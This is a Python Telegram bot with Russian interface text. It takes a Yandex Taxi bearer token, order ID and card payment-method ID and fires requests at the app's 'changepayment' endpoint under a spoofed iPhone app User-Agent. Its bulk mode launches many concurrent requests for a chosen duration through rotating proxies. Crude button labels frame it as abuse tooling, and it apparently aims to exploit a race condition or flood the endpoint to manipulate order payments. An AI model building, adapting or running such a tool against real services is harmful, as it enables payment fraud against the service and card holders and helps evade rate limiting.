import logging
import json
import sqlite3
import asyncio
import random
import tempfile
import os
import threading
from typing import Final, Optional, Tuple, List

import requests
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InputFile
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

from cfg import TOKEN_BOTA


BOT_TOKEN: Final = TOKEN_BOTA

CHANGE_PAYMENT_URL: Final = "https://tc.mobile.yandex.net/3.0/changepayment"
DB_PATH: Final = "bot.db"
PROXY_FILE: Final = "proxy.txt"

(
    ASK_TOKEN,
    ASK_ORDERID,
    ASK_CARD,
    ASK_ID,
    MENU,
    REMEMBER_CARD,
    ASK_THREADS,
    ASK_SECONDS,
    ASK_LOG_SESSION_ID,
) = range(9)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)



PROXIES: List[str] = []
_proxy_cycle = None
_proxy_lock = threading.Lock()


def load_proxies():
    global PROXIES, _proxy_cycle
    if not os.path.exists(PROXY_FILE):
        logger.warning("proxy.txt не найден, работа без прокси.")
        PROXIES = []
        _proxy_cycle = None
        return

    proxies = []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        for line in f:
            p = line.strip()
            if not p:
                continue
            proxies.append(p)

    PROXIES = proxies
    if PROXIES:
        import itertools

        _proxy_cycle = itertools.cycle(PROXIES)
        logger.info("Загружено %d прокси", len(PROXIES))
    else:
        _proxy_cycle = None
        logger.warning("proxy.txt пустой, работа без прокси.")


def get_next_proxy() -> Optional[str]:
    global _proxy_cycle
    if not PROXIES or _proxy_cycle is None:
        return None
    with _proxy_lock:
        try:
            return next(_proxy_cycle)
        except StopIteration:
            return None



def get_conn():
    return sqlite3.connect(DB_PATH)


def init_db():
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL,
            url TEXT NOT NULL,
            method TEXT NOT NULL,
            headers TEXT NOT NULL,
            body TEXT NOT NULL,
            status_code INTEGER,
            response_body TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    try:
        cur.execute("ALTER TABLE requests ADD COLUMN session_id TEXT;")
    except sqlite3.OperationalError:
        pass  # уже есть

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS rec_card (
            tg_id INTEGER PRIMARY KEY,
            card TEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        """
    )

    conn.commit()
    conn.close()


def log_request_to_db(
    tg_id: int,
    url: str,
    headers: dict,
    body: dict,
    status_code: Optional[int],
    response_body: Optional[str],
    session_id: str,
):
    conn = get_conn()
    cur = conn.cursor()

    cur.execute(
        """
        INSERT INTO requests (tg_id, url, method, headers, body, status_code, response_body, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?);
        """,
        (
            tg_id,
            url,
            "POST",
            json.dumps(headers, ensure_ascii=False),
            json.dumps(body, ensure_ascii=False),
            status_code,
            response_body,
            session_id,
        ),
    )

    conn.commit()
    conn.close()


def get_request_count_for_user(tg_id: int) -> int:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM requests WHERE tg_id = ?;", (tg_id,))
    (count,) = cur.fetchone()
    conn.close()
    return count or 0


def save_card_for_user(tg_id: int, card: str):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO rec_card (tg_id, card)
        VALUES (?, ?)
        ON CONFLICT(tg_id) DO UPDATE SET
            card = excluded.card,
            updated_at = CURRENT_TIMESTAMP;
        """,
        (tg_id, card),
    )
    conn.commit()
    conn.close()


def get_saved_card_for_user(tg_id: int) -> Optional[str]:
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT card FROM rec_card WHERE tg_id = ?;", (tg_id,))
    row = cur.fetchone()
    conn.close()
    if row:
        return row[0]
    return None


def export_session_logs_to_file(tg_id: int, session_id: str) -> Optional[str]:

    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, created_at, status_code, response_body
        FROM requests
        WHERE tg_id = ? AND session_id = ?
        ORDER BY id;
        """,
        (tg_id, session_id),
    )
    rows = cur.fetchall()
    conn.close()

    if not rows:
        return None

    fd, path = tempfile.mkstemp(suffix=".txt", prefix=f"logs_{session_id}_")
    os.close(fd)

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"TG ID: {tg_id}\n")
        f.write(f"Session ID: {session_id}\n")
        f.write(f"Всего записей: {len(rows)}\n")
        f.write("=" * 50 + "\n\n")

        for idx, (req_id, created_at, status_code, response_body) in enumerate(
            rows, start=1
        ):
            f.write(f"Запрос #{idx} (DB id={req_id})\n")
            f.write(f"Время: {created_at}\n")
            f.write(f"HTTP статус: {status_code}\n")
            f.write("Ответ:\n")
            f.write(response_body if response_body is not None else "")
            f.write("\n" + "-" * 40 + "\n\n")

    return path



def build_headers(user_token: str) -> dict:
    return {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "ru.yandex.ytaxi/700.100.0.500995 (iPhone; iPhone14,4; iOS 18.3.1; Darwin)",
        "Authorization": f"Bearer {user_token}",
    }


def build_payload(orderid: str, card: str, _id: str) -> dict:
    return {
        "orderid": orderid,
        "payment_method_type": "card",
        "tips": {
            "decimal_value": "0",
            "type": "percent",
        },
        "payment_method_id": card,
        "id": _id,
    }


def generate_session_id() -> str:
    return str(random.randint(10_000, 9_999_999))


def send_with_proxies(
    headers: dict,
    payload: dict,
) -> Tuple[bool, Optional[int], Optional[str], Optional[str]]:
    """
    Логический запрос с использованием списка прокси.
    - Берём следующую прокси;
    - если не работает — берём следующую;
    - на один логический запрос каждую прокси пробуем не более 1 раза;
    - если прокси нет или все умерли — возвращаем ошибку.
    Возвращает (ok, status_code, response_text, used_proxy).
    """
    last_exception_text = None

    if not PROXIES:
        return False, None, "Нет прокси в списке.", None

    max_attempts = len(PROXIES)
    for _ in range(max_attempts):
        proxy = get_next_proxy()
        if not proxy:
            break

        proxies_dict = {
            "http": proxy,
            "https": proxy,
        }

        try:
            resp = requests.post(
                CHANGE_PAYMENT_URL,
                headers=headers,
                json=payload,
                timeout=15,
                proxies=proxies_dict,
            )
            return True, resp.status_code, resp.text, proxy
        except requests.RequestException as e:
            last_exception_text = f"Proxy {proxy} error: {e}"
            logger.warning("Ошибка прокси %s: %s", proxy, e)

    return False, None, last_exception_text, None


def do_single_request_and_log(
    tg_id: int,
    headers: dict,
    payload: dict,
    session_id: str,
    use_proxies: bool,
) -> Tuple[bool, Optional[int], Optional[str]]:
    """
    Один логический запрос:
    - либо через прокси (если use_proxies=True и список не пуст),
    - либо напрямую.
    Логирование в БД.
    """
    used_proxy = None
    status_code = None
    response_text = None
    ok = False

    if use_proxies and PROXIES:
        ok, status_code, response_text, used_proxy = send_with_proxies(headers, payload)
    else:
        try:
            resp = requests.post(
                CHANGE_PAYMENT_URL,
                headers=headers,
                json=payload,
                timeout=15,
            )
            status_code = resp.status_code
            response_text = resp.text
            ok = True
        except requests.RequestException as e:
            response_text = str(e)
            ok = False


    try:
        enriched_body = dict(payload)
        if used_proxy:
            enriched_body["_used_proxy"] = used_proxy

        log_request_to_db(
            tg_id=tg_id,
            url=CHANGE_PAYMENT_URL,
            headers=headers,
            body=enriched_body,
            status_code=status_code,
            response_body=response_text,
            session_id=session_id,
        )
    except Exception as e:
        logger.exception("Ошибка при логировании запроса в БД: %s", e)

    return ok, status_code, response_text


def main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            ["Заебашить", "Сменить оплату"],
            ["Поставить потоки", "Профиль"],
            ["Запомнить карту", "Прокси вкл/выкл"],
            ["Посмотреть логи", "Логи последней сессии"],
            ["Остановить блядство"],
        ],
        resize_keyboard=True,
    )



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "use_proxies" not in context.user_data:
        context.user_data["use_proxies"] = True

    use_proxies = context.user_data["use_proxies"]
    proxy_state = "ВКЛ" if use_proxies and PROXIES else "ВЫКЛ (или список пуст)"

    await update.message.reply_text(
        "Привет! 👋\n"
        "Я бот для отправки запроса changepayment.\n\n"
        "Нажми «Заебашить», чтобы начать вводить данные и слать запросы.\n"
        "Можешь предварительно включить/выключить прокси кнопкой «Прокси вкл/выкл».\n\n"
        f"Текущее состояние прокси: {proxy_state}",
        reply_markup=main_keyboard(),
    )
    return MENU


async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    context.user_data["token"] = token

    await update.message.reply_text(
        "Ок. Теперь отправь, пожалуйста, <orderid>:"
    )
    return ASK_ORDERID


async def ask_orderid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    orderid = update.message.text.strip()
    context.user_data["orderid"] = orderid

    user = update.effective_user
    tg_id = user.id if user else None

    saved_card = get_saved_card_for_user(tg_id) if tg_id is not None else None

    if saved_card:
        context.user_data["card"] = saved_card
        await update.message.reply_text(
            f"Использую запомненную карту: {saved_card}\n"
            f"Если хочешь её изменить — нажми кнопку «Запомнить карту» и введи новую.\n\n"
            f"Теперь отправь, пожалуйста, <id>:"
        )
        return ASK_ID
    else:
        await update.message.reply_text(
            "Принято. Теперь отправь, пожалуйста, <card> (payment_method_id):"
        )
        return ASK_CARD


async def ask_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = update.message.text.strip()
    context.user_data["card"] = card

    await update.message.reply_text(
        "Отлично. Теперь отправь, пожалуйста, <id>:"
    )
    return ASK_ID


async def ask_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _id = update.message.text.strip()
    context.user_data["id"] = _id

    await update.message.reply_text(
        "Все параметры сохранены ✅\n\n"
        "Теперь ты можешь:\n"
        "• «Сменить оплату» — один POST-запрос.\n"
        "• «Поставить потоки» — массовая отправка.\n"
        "• «Профиль» — статистика.\n"
        "• «Запомнить карту» — сохранить карту.\n"
        "• «Посмотреть логи» или «Логи последней сессии».\n"
        "• «Остановить блядство» — прервать массовую отправку.",
        reply_markup=main_keyboard(),
    )
    return MENU


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()

    if text == "Заебашить":
        use_proxies = context.user_data.get("use_proxies", True)
        proxy_state = "ВКЛ" if use_proxies and PROXIES else "ВЫКЛ (или список пуст)"
        await update.message.reply_text(
            "Окей, погнали. 🚀\n"
            f"Сейчас прокси: {proxy_state}\n\n"
            "Сначала отправь токен (только сам <token>, без Bearer):",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_TOKEN

    if text == "Сменить оплату":
        return await change_payment(update, context)

    if text == "Изменить параметры":
        await update.message.reply_text(
            "Ок, давай введём параметры заново.\n"
            "Отправь новый токен (только <token>, без Bearer):",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_TOKEN

    if text == "Профиль":
        return await show_profile(update, context)

    if text == "Запомнить карту":
        await update.message.reply_text(
            "Отправь карту (payment_method_id), которую нужно запомнить:",
            reply_markup=ReplyKeyboardRemove(),
        )
        return REMEMBER_CARD

    if text == "Поставить потоки":
        await update.message.reply_text(
            "Введи количество потоков (одновременных запросов, целое число):",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_THREADS

    if text == "Посмотреть логи":
        await update.message.reply_text(
            "Введи ID сессии (5–7 цифр), лог которой хочешь получить:",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_LOG_SESSION_ID

    if text == "Логи последней сессии":
        return await last_session_logs(update, context)

    if text == "Прокси вкл/выкл":
        current = context.user_data.get("use_proxies", True)
        new_value = not current
        context.user_data["use_proxies"] = new_value
        state = "ВКЛ" if new_value and PROXIES else "ВЫКЛ (или список пуст)"
        await update.message.reply_text(
            f"Прокси теперь: {state}",
            reply_markup=main_keyboard(),
        )
        return MENU

    if text == "Остановить блядство":
        stop_event: Optional[asyncio.Event] = context.user_data.get("stop_event")
        if isinstance(stop_event, asyncio.Event) and not stop_event.is_set():
            stop_event.set()
            await update.message.reply_text(
                "Окей, останавливаю блядство. ⛔ "
                "Текущие запросы дойдут до конца, новые запускаться не будут.",
                reply_markup=main_keyboard(),
            )
        else:
            await update.message.reply_text(
                "Сейчас нет активной массовой отправки.",
                reply_markup=main_keyboard(),
            )
        return MENU

    await update.message.reply_text(
        "Не понял команду. Используй кнопки на клавиатуре.",
        reply_markup=main_keyboard(),
    )
    return MENU


async def show_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    total_requests = get_request_count_for_user(tg_id)
    saved_card = get_saved_card_for_user(tg_id)
    last_session_id = context.user_data.get("last_session_id")
    use_proxies = context.user_data.get("use_proxies", True)
    proxy_state = "ВКЛ" if use_proxies and PROXIES else "ВЫКЛ (или список пуст)"

    if saved_card:
        msg = (
            f"👤 Профиль\n\n"
            f"TG ID: <code>{tg_id}</code>\n"
            f"Всего отправлено запросов: <b>{total_requests}</b>\n"
            f"Запомненная карта: <code>{saved_card}</code>\n"
        )
    else:
        msg = (
            f"👤 Профиль\n\n"
            f"TG ID: <code>{tg_id}</code>\n"
            f"Всего отправлено запросов: <b>{total_requests}</b>\n"
            f"Запомненная карта: не сохранена\n"
        )

    msg += f"\nПрокси: {proxy_state}\n"

    if last_session_id:
        msg += f"\nПоследний ID сессии: <code>{last_session_id}</code>\n"

    msg += "\nКнопка «Логи последней сессии» сразу скинет .txt по последней сессии."

    await update.message.reply_text(
        msg,
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MENU


async def remember_card_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔 Попробуй ещё раз.",
            reply_markup=main_keyboard(),
        )
        return MENU

    card = update.message.text.strip()
    save_card_for_user(tg_id, card)
    context.user_data["card"] = card

    await update.message.reply_text(
        f"Карта <code>{card}</code> сохранена ✅\n"
        f"Теперь она будет автоматически подставляться в запросы.\n"
        f"Если захочешь её поменять — снова нажми «Запомнить карту».",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MENU


async def ask_threads_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        threads = int(text)
        if threads <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное число потоков. Попробуй ещё раз:"
        )
        return ASK_THREADS

    context.user_data["threads"] = threads
    await update.message.reply_text(
        "Ок. Теперь введи количество секунд, в течение которых слать запросы:"
    )
    return ASK_SECONDS


async def ask_seconds_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        seconds = int(text)
        if seconds <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное количество секунд. Попробуй ещё раз:"
        )
        return ASK_SECONDS

    threads = context.user_data.get("threads")
    if not threads:
        await update.message.reply_text(
            "Что-то пошло не так с количеством потоков. Начни заново.",
            reply_markup=main_keyboard(),
        )
        return MENU

    await bulk_change_payment(update, context, threads, seconds)
    return MENU


async def ask_log_session_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    session_id = update.message.text.strip()

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    if not (session_id.isdigit() and 5 <= len(session_id) <= 7):
        await update.message.reply_text(
            "ID сессии должен быть из 5–7 цифр. Попробуй ещё раз или нажми любую кнопку.",
            reply_markup=main_keyboard(),
        )
        return MENU

    path = export_session_logs_to_file(tg_id, session_id)
    if path is None:
        await update.message.reply_text(
            f"Логи для сессии {session_id} не найдены.",
            reply_markup=main_keyboard(),
        )
        return MENU

    try:
        with open(path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=f"logs_{session_id}.txt"),
                caption=f"Логи для сессии {session_id}",
            )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    await update.message.reply_text(
        "Готово ✅",
        reply_markup=main_keyboard(),
    )
    return MENU


async def last_session_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔",
            reply_markup=main_keyboard(),
        )
        return MENU

    session_id = context.user_data.get("last_session_id")
    if not session_id:
        await update.message.reply_text(
            "У тебя пока нет последней сессии (ещё не отправлял запросы).",
            reply_markup=main_keyboard(),
        )
        return MENU

    path = export_session_logs_to_file(tg_id, session_id)
    if path is None:
        await update.message.reply_text(
            f"Логи для последней сессии {session_id} не найдены.",
            reply_markup=main_keyboard(),
        )
        return MENU

    try:
        with open(path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=f"logs_{session_id}.txt"),
                caption=f"Логи для последней сессии {session_id}",
            )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    await update.message.reply_text(
        "Готово ✅",
        reply_markup=main_keyboard(),
    )
    return MENU


async def change_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Один запрос (отдельная сессия).
    """
    user = update.effective_user
    tg_id = user.id if user else 0

    user_token = context.user_data.get("token")
    orderid = context.user_data.get("orderid")

    saved_card = get_saved_card_for_user(tg_id)
    if saved_card:
        card = saved_card
        context.user_data["card"] = card
    else:
        card = context.user_data.get("card")

    _id = context.user_data.get("id")

    if not all([user_token, orderid, card, _id]):
        await update.message.reply_text(
            "Похоже, какие-то параметры не заданы. Нажми «Заебашить» и введи данные заново.",
            reply_markup=main_keyboard(),
        )
        return MENU

    use_proxies = context.user_data.get("use_proxies", True)

    session_id = generate_session_id()
    context.user_data["last_session_id"] = session_id

    proxy_state = "ВКЛ" if use_proxies and PROXIES else "ВЫКЛ (или список пуст)"

    await update.message.reply_text(
        f"Отправляю запрос... ⏳\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Прокси: {proxy_state}",
        parse_mode="HTML",
    )

    headers = build_headers(user_token)
    payload = build_payload(orderid, card, _id)

    loop = asyncio.get_running_loop()
    ok, status_code, response_text = await loop.run_in_executor(
        None, do_single_request_and_log, tg_id, headers, payload, session_id, use_proxies
    )

    if response_text is None:
        response_text = ""

    max_len = 1500
    body_text = response_text[:max_len] + (
        "\n\n[ответ обрезан]" if len(response_text) > max_len else ""
    )

    if ok:
        msg = (
            f"✅ Запрос отправлен.\n"
            f"ID сессии: <code>{session_id}</code>\n"
            f"Прокси: {proxy_state}\n\n"
            f"Статус: {status_code}\n"
            f"Тело ответа:\n<pre>{body_text}</pre>"
        )
    else:
        msg = (
            f"❌ Не удалось отправить запрос.\n"
            f"ID сессии: <code>{session_id}</code>\n"
            f"Прокси: {proxy_state}\n"
            f"Статус: {status_code}\n"
            f"Подробности:\n<pre>{body_text}</pre>"
        )

    await update.message.reply_text(
        msg, parse_mode="HTML", reply_markup=main_keyboard()
    )
    return MENU


async def bulk_change_payment(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    threads: int,
    seconds: int,
):
    """
    Массовая отправка: threads — максимум одновременных логических запросов,
    seconds — "длительность", всего логических запросов = threads * seconds.
    Одна общая session_id.
    Можно остановить по кнопке «Остановить блядство»:
    - новые запросы не стартуют,
    - текущие (максимум = threads) добегают и всё.
    """
    user = update.effective_user
    tg_id = user.id if user else 0
    chat_id = update.effective_chat.id

    user_token = context.user_data.get("token")
    orderid = context.user_data.get("orderid")

    saved_card = get_saved_card_for_user(tg_id)
    if saved_card:
        card = saved_card
        context.user_data["card"] = card
    else:
        card = context.user_data.get("card")

    _id = context.user_data.get("id")

    if not all([user_token, orderid, card, _id]):
        await update.message.reply_text(
            "Параметры не заданы полностью. Нажми «Заебашить» и введи данные.",
            reply_markup=main_keyboard(),
        )
        return

    use_proxies = context.user_data.get("use_proxies", True)
    proxy_state = "ВКЛ" if use_proxies and PROXIES else "ВЫКЛ (или список пуст)"

    headers = build_headers(user_token)
    payload = build_payload(orderid, card, _id)

    total_requests = threads * seconds
    session_id = generate_session_id()
    context.user_data["last_session_id"] = session_id

    await update.message.reply_text(
        f"Запускаю массовую отправку.\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Потоки (одновременных запросов): {threads}\n"
        f"Условное время: {seconds} сек\n"
        f"Всего логических запросов: ~{total_requests}\n"
        f"Прокси: {proxy_state}\n\n"
        f"Каждые 5 секунд буду присылать лог (headers, body, последний ответ).\n"
        f"Чтобы остановить — нажми «Остановить блядство».",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )

    loop = asyncio.get_running_loop()

    # Очередь задач и прогресс
    queue: asyncio.Queue[int] = asyncio.Queue()
    for i in range(total_requests):
        queue.put_nowait(i)

    progress = {
        "completed": 0,
        "success": 0,
        "last_status": None,
        "last_response": "",
    }

    # stop_event будет выставляться по кнопке «Остановить блядство»
    stop_event = asyncio.Event()
    context.user_data["stop_event"] = stop_event

    async def worker(name: int):
        """
        Воркер: берёт job из очереди, пока:
        - очередь не кончилась, и
        - не нажали «Остановить блядство».
        """
        while not stop_event.is_set():
            try:
                _ = queue.get_nowait()
            except asyncio.QueueEmpty:
                break  # работы больше нет

            if stop_event.is_set():
                queue.task_done()
                break

            ok, status_code, response_text = await loop.run_in_executor(
                None,
                do_single_request_and_log,
                tg_id,
                headers,
                payload,
                session_id,
                use_proxies,
            )

            progress["completed"] += 1
            if ok:
                progress["success"] += 1
            progress["last_status"] = status_code
            if response_text:
                max_len = 800
                progress["last_response"] = (
                    response_text[:max_len]
                    + ("\n\n[ответ обрезан]" if len(response_text) > max_len else "")
                )

            queue.task_done()

            # ещё раз проверим, не пришёл ли стоп после выполнения запроса
            if stop_event.is_set():
                break

    async def reporter():
        """
        Каждые 5 секунд шлём промежуточный лог, пока:
        - не отработал стоп,
        - и пока идёт работа.
        """
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break

            try:
                msg = (
                    f"📊 Промежуточный лог\n"
                    f"ID сессии: <code>{session_id}</code>\n"
                    f"Выполнено логических запросов: {progress['completed']} из ~{total_requests}\n"
                    f"Успешных: {progress['success']}\n"
                    f"Последний статус: {progress['last_status']}\n"
                    f"Прокси: {proxy_state}\n\n"
                    f"<b>Headers</b>:\n<pre>{json.dumps(headers, ensure_ascii=False, indent=2)}</pre>\n"
                    f"<b>Body</b>:\n<pre>{json.dumps(payload, ensure_ascii=False, indent=2)}</pre>\n"
                    f"<b>Последний ответ</b>:\n<pre>{progress['last_response']}</pre>"
                )
                await context.bot.send_message(
                    chat_id=chat_id, text=msg, parse_mode="HTML"
                )
            except Exception as e:
                logger.warning("Ошибка отправки репорта: %s", e)

    # Стартуем воркеры (не больше threads, и смысла больше нет)
    workers = [
        asyncio.create_task(worker(i))
        for i in range(min(threads, total_requests))
    ]
    reporter_task = asyncio.create_task(reporter())

    # Ждём, пока либо всё выполнится, либо ты нажмёшь стоп
    # когда нажмёшь «Остановить блядство», stop_event.set() вызовется в menu_handler
    await asyncio.gather(*workers, return_exceptions=True)

    # сигналим репортёру, что всё, хватит
    stop_event.set()
    try:
        await reporter_task
    except Exception:
        pass

    # очищаем стоп-ивент в user_data
    context.user_data.pop("stop_event", None)

    success = progress["success"]
    completed = progress["completed"]

    await update.message.reply_text(
        f"Массовая отправка завершена (или остановлена).\n"
        f"ID сессии: <code>{session_id}</code>\n"
        f"Прокси: {proxy_state}\n"
        f"Успешных логических запросов: {success} из {completed} (запланировано было ~{total_requests})",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Диалог завершён. Чтобы начать сначала — отправь /start.",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ConversationHandler.END



def main():
    init_db()
    load_proxies()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_token)],
            ASK_ORDERID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_orderid)],
            ASK_CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_card)],
            ASK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_id)],
            MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, menu_handler)],
            REMEMBER_CARD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, remember_card_handler)
            ],
            ASK_THREADS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_threads_handler)
            ],
            ASK_SECONDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_seconds_handler)
            ],
            ASK_LOG_SESSION_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_log_session_handler)
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),  # <--- добавили
        ],
    )

    app.add_handler(conv)

    app.run_polling()


if __name__ == "__main__":
    main()
